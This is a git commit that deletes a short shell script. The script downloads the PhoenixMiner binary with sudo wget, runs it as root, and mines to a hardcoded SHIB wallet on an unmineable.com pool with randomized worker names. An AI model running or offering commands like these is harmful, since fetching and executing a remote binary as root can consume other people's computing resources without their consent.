ebd90a468826183b836a6fe7e3fab9aacf51ec79
Diefky <Diefky@users.noreply.github.com>
2021-08-18 15:12:20 +0700

    Delete SHII.sh

--- SHII.sh
+++
@@ -1,7 +0,0 @@
-sudo apt update
-sudo apt install libpci3
-sudo wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz
-tar -xvf PhoenixMiner_5.6d_Linux.tar.gz
-cd PhoenixMiner_5.6d_Linux
-sudo ./PhoenixMiner -epool ethash-asia.unmineable.com:3333 -wal SHIB:0x82c675570d3d4d5b79e337f1f5722395c94e1631.$(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1)) -pass x -proto 1 
-sleep 99999
